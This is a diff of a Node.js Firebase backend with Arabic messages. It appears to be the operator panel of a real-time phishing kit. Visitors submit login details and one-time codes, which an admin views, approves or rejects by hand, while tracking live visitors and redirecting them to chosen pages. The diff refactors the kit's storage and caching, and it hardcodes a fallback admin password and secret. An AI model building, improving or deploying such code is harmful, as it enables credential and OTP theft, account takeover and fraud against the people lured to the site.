@@ -1,7 +1,7 @@
 const crypto = require('crypto');
 const http = require('http');
 const { initializeApp, cert, getApps } = require('firebase-admin/app');
-const { getFirestore } = require('firebase-admin/firestore');
+const { getFirestore, FieldValue } = require('firebase-admin/firestore');
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha09876@@';
 const HMAC_SECRET = process.env.HMAC_SECRET || 'maqrq_admin_secret_2024';
@@ -14,10 +14,11 @@ if (!getApps().length) {
   initializeApp({ credential: cert(sa) });
 }
 const db = getFirestore();
-const usersCol = db.collection('maqrq_users');
-const requestsCol = db.collection('maqrq_requests');
 
-// --- In-memory cache ---
+const usersDoc = db.doc('maqrq_store/users');
+const requestsDoc = db.doc('maqrq_store/requests');
+
+const CACHE_TTL = 60000;
 const _cache = {};
 function cached(key, ttlMs, fn) {
   const entry = _cache[key];
@@ -28,6 +29,32 @@ function clearCache(prefix) {
   for (const k of Object.keys(_cache)) {
     if (!prefix || k.startsWith(prefix)) delete _cache[k];
   }
+}
+
+async function loadUsers() {
+  return cached('store.users', CACHE_TTL, async () => {
+    const doc = await usersDoc.get();
+    return doc.exists ? doc.data() : {};
+  });
+}
+
+async function loadRequests() {
+  return cached('store.requests', CACHE_TTL, async () => {
+    const doc = await requestsDoc.get();
+    return doc.exists ? doc.data() : {};
+  });
+}
+
+async function saveUser(sessionId, data) {
+  await usersDoc.set({ [sessionId]: data }, { merge: true });
+  clearCache('store.users');
+  clearCache('admin.');
+}
+
+async function saveRequest(requestId, data) {
+  await requestsDoc.set({ [requestId]: data }, { merge: true });
+  clearCache('store.requests');
+  clearCache('admin.');
 }
 
 function generateId() {
@@ -93,52 +120,8 @@ function getCountryFromIp(ip) {
   });
 }
 
-// --- Firestore helpers ---
-async function getUser(sessionId) {
-  const doc = await usersCol.doc(sessionId).get();
-  return doc.exists ? doc.data() : null;
-}
-
-async function setUser(sessionId, data) {
-  await usersCol.doc(sessionId).set(data, { merge: true });
-  clearCache('users.');
-  clearCache('admin.');
-}
-
-async function getRequest(requestId) {
-  const doc = await requestsCol.doc(requestId).get();
-  return doc.exists ? doc.data() : null;
-}
-
-async function setRequest(requestId, data) {
-  await requestsCol.doc(requestId).set(data, { merge: true });
-  clearCache('requests.');
-  clearCache('admin.');
-}
-
-async function getUserRequests(sessionId) {
-  return cached(`requests.${sessionId}`, 5000, async () => {
-    const snap = await requestsCol.where('user_session_id', '==', sessionId).get();
-    return snap.docs.map(d => d.data());
-  });
-}
-
-async function getAllUsers() {
-  return cached('admin.allUsers', 5000, async () => {
-    const snap = await usersCol.get();
-    const users = {};
-    snap.docs.forEach(d => { users[d.id] = d.data(); });
-    return users;
-  });
-}
-
-async function getAllRequests() {
-  return cached('admin.allRequests', 5000, async () => {
-    const snap = await requestsCol.get();
-    const reqs = {};
-    snap.docs.forEach(d => { reqs[d.id] = d.data(); });
-    return reqs;
-  });
+function getUserRequestsFromAll(allRequests, sessionId) {
+  return Object.values(allRequests).filter(r => r.user_session_id === sessionId);
 }
 
 module.exports = async (req, res) => {
@@ -155,7 +138,6 @@ module.exports = async (req, res) => {
     }
   }
 
-  // --- Admin Login ---
   if (path === '/admin/login' && method === 'POST') {
     const password = body?.password;
     if (password === ADMIN_PASSWORD) {
@@ -166,13 +148,11 @@ module.exports = async (req, res) => {
     return res.status(401).json({ status: 'error', message: 'كلمة المرور غير صحيحة' });
   }
 
-  // --- Admin Logout ---
   if (path === '/admin/logout') {
     res.setHeader('Set-Cookie', 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
     return res.writeHead(302, { Location: '/admin_login.html' }).end();
   }
 
-  // --- Admin Panel Redirect ---
   if (path === '/admin' && method === 'GET') {
     if (verifyAdminToken(cookies.admin_token)) {
       return res.writeHead(302, { Location: '/admin.html' }).end();
@@ -180,16 +160,14 @@ module.exports = async (req, res) => {
     return res.writeHead(302, { Location: '/admin_login.html' }).end();
   }
 
-  // --- Admin API auth check ---
   const isAdminApi = path.startsWith('/admin/') && path !== '/admin/login' && path !== '/admin/logout';
   if (isAdminApi && !verifyAdminToken(cookies.admin_token)) {
     return res.status(401).json({ status: 'error', message: 'غير مصرح لك بالوصول' });
   }
 
-  // --- All Requests ---
   if (path === '/admin/all_requests') {
-    const allUsers = await getAllUsers();
-    const allReqs = await getAllRequests();
+    const allUsers = await loadUsers();
+    const allReqs = await loadRequests();
     const reqsBySession = {};
     for (const r of Object.values(allReqs)) {
       if (!reqsBySession[r.user_session_id]) reqsBySession[r.user_session_id] = [];
@@ -221,14 +199,15 @@ module.exports = async (req, res) => {
     return res.status(200).json(sessionsList);
   }
 
-  // --- Request Details ---
   let m;
   if ((m = path.match(/^\/admin\/request_details\/(.+)$/))) {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
+    const allUsers = await loadUsers();
+    const user = allUsers[sessionId];
     if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
 
-    const reqs = await getUserRequests(sessionId);
+    const allReqs = await loadRequests();
+    const reqs = getUserRequestsFromAll(allReqs, sessionId);
     const userData = {};
     reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });
 
@@ -244,59 +223,56 @@ module.exports = async (req, res) => {
     });
   }
 
-  // --- Approve/Reject Login ---
   if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
-    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
-    const reqs = await getUserRequests(sessionId);
+    const allReqs = await loadRequests();
+    const reqs = getUserRequestsFromAll(allReqs, sessionId);
     const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
     if (pending.length > 0) {
-      await setRequest(pending[0].id, { status: 'approved', admin_action_time: new Date().toISOString() });
+      const updated = { ...pending[0], status: 'approved', admin_action_time: new Date().toISOString() };
+      await saveRequest(pending[0].id, updated);
     }
     return res.status(200).json({ status: 'success', message: 'تمت الموافقة على تسجيل الدخول' });
   }
 
   if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
-    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
-    const reqs = await getUserRequests(sessionId);
+    const allReqs = await loadRequests();
+    const reqs = getUserRequestsFromAll(allReqs, sessionId);
     const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
     if (pending.length > 0) {
-      await setRequest(pending[0].id, { status: 'rejected', admin_action_time: new Date().toISOString() });
+      const updated = { ...pending[0], status: 'rejected', admin_action_time: new Date().toISOString() };
+      await saveRequest(pending[0].id, updated);
     }
     return res.status(200).json({ status: 'success', message: 'تم رفض تسجيل الدخول' });
   }
 
-  // --- Approve/Reject OTP ---
   if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
-    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
-    const reqs = await getUserRequests(sessionId);
+    const allReqs = await loadRequests();
+    const reqs = getUserRequestsFromAll(allReqs, sessionId);
     const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
     if (pending.length > 0) {
-      await setRequest(pending[0].id, { status: 'approved', admin_action_time: new Date().toISOString() });
+      const updated = { ...pending[0], status: 'approved', admin_action_time: new Date().toISOString() };
+      await saveRequest(pending[0].id, updated);
     }
     return res.status(200).json({ status: 'success', message: 'تمت الموافقة على OTP' });
   }
 
   if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
-    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
-    const reqs = await getUserRequests(sessionId);
+    const allReqs = await loadRequests();
+    const reqs = getUserRequestsFromAll(allReqs, sessionId);
     const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
     if (pending.length > 0) {
-      await setRequest(pending[0].id, { status: 'rejected', admin_action_time: new Date().toISOString() });
+      const updated = { ...pending[0], status: 'rejected', admin_action_time: new Date().toISOString() };
+      await saveRequest(pending[0].id, updated);
     }
     return res.status(200).json({ status: 'success', message: 'تم رفض OTP' });
   }
 
-  // --- Active Visits ---
   if (path === '/admin/active_visits') {
-    const allUsers = await getAllUsers();
+    const allUsers = await loadUsers();
     const cutoff = new Date(Date.now() - 5 * 60 * 1000);
     const visits = Object.values(allUsers)
       .filter(u => new Date(u.last_activity) >= cutoff)
@@ -310,18 +286,17 @@ module.exports = async (req, res) => {
     return res.status(200).json(visits);
   }
 
-  // --- Redirect User ---
   if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
     const sessionId = decodeURIComponent(m[1]);
-    const user = await getUser(sessionId);
+    const allUsers = await loadUsers();
+    const user = allUsers[sessionId];
     if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
     const targetPage = body?.target_page;
     if (!targetPage) return res.status(400).json({ status: 'error', message: 'الصفحة المستهدفة غير محددة' });
-    await setUser(sessionId, { redirect_to: targetPage });
+    await saveUser(sessionId, { ...user, redirect_to: targetPage });
     return res.status(200).json({ status: 'success', message: 'تم تعيين إعادة التوجيه للمستخدم' });
   }
 
-  // --- Submit Request ---
   if (path === '/submit_request' && method === 'POST') {
     if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
 
@@ -344,7 +319,8 @@ module.exports = async (req, res) => {
     const sid = cookies.user_session_id || generateId();
     const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
 
-    let user = await getUser(sid);
+    const allUsers = await loadUsers();
+    let user = allUsers[sid] || null;
     if (!user) {
       user = {
         id: generateId(),
@@ -360,13 +336,14 @@ module.exports = async (req, res) => {
     user.last_activity = new Date().toISOString();
     user.redirect_to = null;
     if (!user.country) user.country = await getCountryFromIp(ip);
-    await setUser(sid, user);
+    await saveUser(sid, user);
 
     const autoApprove = ['personal_info', 'watch_request'].includes(requestType);
 
     let reqObj = null;
     if (['login', 'otp'].includes(requestType)) {
-      const existingReqs = await getUserRequests(sid);
+      const allReqs = await loadRequests();
+      const existingReqs = getUserRequestsFromAll(allReqs, sid);
       const rejected = existingReqs
         .filter(r => r.type === requestType && r.status === 'rejected')
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -378,7 +355,7 @@ module.exports = async (req, res) => {
           timestamp: new Date().toISOString(),
           admin_action_time: null
         };
-        await setRequest(rejected[0].id, reqObj);
+        await saveRequest(rejected[0].id, reqObj);
       }
     }
 
@@ -393,7 +370,7 @@ module.exports = async (req, res) => {
         timestamp: new Date().toISOString(),
         admin_action_time: autoApprove ? new Date().toISOString() : null
       };
-      await setRequest(newId, reqObj);
+      await saveRequest(newId, reqObj);
     }
 
     res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
@@ -404,12 +381,13 @@ module.exports = async (req, res) => {
     });
   }
 
-  // --- Request Status ---
   if ((m = path.match(/^\/request_status\/(.+)$/))) {
     const requestId = decodeURIComponent(m[1]);
-    const reqObj = await getRequest(requestId);
+    const allReqs = await loadRequests();
+    const reqObj = allReqs[requestId];
     if (!reqObj) return res.status(404).json({ status: 'error', message: 'الطلب غير موجود' });
-    const user = await getUser(reqObj.user_session_id);
+    const allUsers = await loadUsers();
+    const user = allUsers[reqObj.user_session_id];
     return res.status(200).json({
       status: reqObj.status,
       type: reqObj.type,
@@ -418,19 +396,17 @@ module.exports = async (req, res) => {
     });
   }
 
-  // --- Clear Redirect ---
   if (path === '/clear_redirect' && method === 'POST') {
     const sid = cookies.user_session_id;
     if (sid) {
-      const user = await getUser(sid);
-      if (user) {
-        await setUser(sid, { redirect_to: null });
+      const allUsers = await loadUsers();
+      if (allUsers[sid]) {
+        await saveUser(sid, { ...allUsers[sid], redirect_to: null });
       }
     }
     return res.status(200).json({ status: 'success' });
   }
 
-  // --- Track Visit ---
   if (path === '/track_visit' && method === 'POST') {
     if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
     const page = body.page;
@@ -439,7 +415,8 @@ module.exports = async (req, res) => {
     const sid = cookies.user_session_id || generateId();
     const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
 
-    let user = await getUser(sid);
+    const allUsers = await loadUsers();
+    let user = allUsers[sid] || null;
     if (!user) {
       user = {
         id: generateId(),
@@ -454,7 +431,7 @@ module.exports = async (req, res) => {
     user.current_page = page;
     user.last_activity = new Date().toISOString();
     if (!user.country) user.country = await getCountryFromIp(ip);
-    await setUser(sid, user);
+    await saveUser(sid, user);
 
     res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
     return res.status(200).json({ status: 'success', message: 'تم تحديث الزيارة' });
